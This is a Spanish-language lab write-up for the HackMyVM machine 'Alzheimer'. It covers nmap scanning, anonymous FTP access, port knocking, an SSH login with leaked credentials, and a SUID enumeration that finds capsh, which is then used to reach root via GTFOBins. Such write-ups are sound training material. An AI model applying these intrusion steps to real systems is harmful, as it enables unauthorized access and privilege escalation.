---
layout: single
title: Alzheimer - HackMyVM
excerpt: "Alzheimer es una máquina Linux creada por sML, en esta máquina veremos un golpeo de puertos para abrir puertos que estan cerrados, encontraremos unas credenciales de acceso al
SSH y elevaremos privilegios mediante un binario SUID."
date: 2021-09-30
classes: wide
header:
  teaser: /assets/images/hmvm-Alzheimer/hmvm-Alzheimer.png
  teaser_home_page: true
  icon: /assets/images/hmvm.png
categories:
  - hackmyvm
  - linux
  - Fácil
tags:
  - hackmyvm
  - port-knocking
  - stored-creds
  - suid
  - sML
---

### Escaneo de puertos
```bash
❯ nmap -p- --open -T5 -v -n 192.168.1.147

PORT   STATE SERVICE
21/tcp open  ftp
```

### Escaneo de servicios
```bash
❯ nmap -sCV -p 21 192.168.1.147

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.1.42
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
Service Info: OS: Unix
```

### FTP
Me conecto al servidor FTP con el usuario anonymous.

```bash
❯ ftp 192.168.1.147
Connected to 192.168.1.147.
220 (vsFTPd 3.0.3)
Name (192.168.1.147:noname): anonymous
331 Please specify the password.
Password:
230 Login successful.
```

Lanzo un `ls -la` y veo un archivo de texto oculto.
```bash
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        113          4096 Oct 03  2020 .
drwxr-xr-x    2 0        113          4096 Oct 03  2020 ..
-rw-r--r--    1 0        0              70 Oct 03  2020 .secretnote.txt
```

Lo descargo y miro lo que contiene.

![](/assets/images/hmvm-Alzheimer/secretnote.png)

Lanzo nmap a los puertos encontrados en el archivo de texto para simular un golpeo de puertos.
```bash
❯ nmap -p 1000,2000,3000 192.168.1.147
PORT     STATE  SERVICE
1000/tcp closed cadlock
2000/tcp closed cisco-sccp
3000/tcp closed ppp
```

Vuelvo a escanear los puertos con nmap y encuentra dos puertos nuevos.
```bash
❯ nmap -p- --open -T5 -v -n 192.168.1.147

PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

Escaneo los servicios de los dos puertos nuevos.
```bash
❯ nmap -sCV -p 22,80 192.168.1.147
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 b1:3b:2b:36:e5:6b:d7:2a:6d:ef:bf:da:0a:5d:2d:43 (RSA)
|   256 35:f1:70:ab:a3:66:f1:d6:d7:2c:f7:d1:24:7a:5f:2b (ECDSA)
|_  256 be:15:fa:b6:81:d6:7f:ab:c8:1c:97:a5:ea:11:85:4e (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

### HTTP
Si vamos al servidor web veremos el siguiente mensaje y un usuario:

![](/assets/images/hmvm-Alzheimer/codigofuente.png)

Si decodificamos el código morse obtenemos lo siguiente.
```
NOTHING
```
### SSH
Nos conectamos a la máquina por ssh con la password encontrada en el archivo `secretnote.txt` y podremos leer la flag de user.
```bash
medusa@alzheimer:~$ cat user.txt 
HMVrespecxxxxxxxes
```

### Elevación privilegios
Hago una busqueda de binarios con permisos SUID y encuentra capsh.
```bash
medusa@alzheimer:~$ find / -perm -4000 2>/dev/null
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/umount
/usr/bin/gpasswd
/usr/sbin/capsh
```

Medusa tiene permisos SUID sobre el binario capsh.

![](/assets/images/hmvm-Alzheimer/binariocapsh.png)

Usaremos el recurso GTFOBINS.

![](/assets/images/hmvm-Alzheimer/gtfobinsSUID.png)

Obtenemos el root.

![](/assets/images/hmvm-Alzheimer/root.png)

Como root ya puedo leer la flag.
```bash
root@alzheimer:/root# cat root.txt 
HMVxxxxxxxxxxes
```
